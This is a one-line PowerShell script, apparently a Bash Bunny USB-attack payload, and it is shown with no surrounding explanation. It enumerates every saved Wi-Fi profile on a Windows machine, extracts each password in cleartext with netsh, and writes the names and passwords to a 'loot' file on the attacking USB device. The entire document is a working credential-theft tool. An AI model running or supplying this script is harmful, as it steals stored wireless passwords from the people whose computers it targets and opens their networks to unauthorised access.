if ([console]::CapsLock) { $wsh = New-Object -ComObject WScript.Shell; $wsh.SendKeys('{CAPSLOCK}') }; $bb = (Get-WmiObject win32_volume -Filter "label='BashBunny'").Name; $Profiles = (netsh wlan show profiles) | Select-String ":\s(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }; $res = $Profiles | ForEach-Object { $SSID = $_; (netsh wlan show profile name="$SSID" key=clear) | Select-String "Key Content\s+:\s(.+)$" | ForEach-Object { $pass = $_.Matches.Groups[1].Value.Trim(); [PSCustomObject]@{ Wireless_Network_Name = $SSID; Password = $pass } } }; $res | Format-Table -AutoSize | Out-File -FilePath "$bb\loot\wifi_pass.txt" -Encoding ASCII -Width 50; exit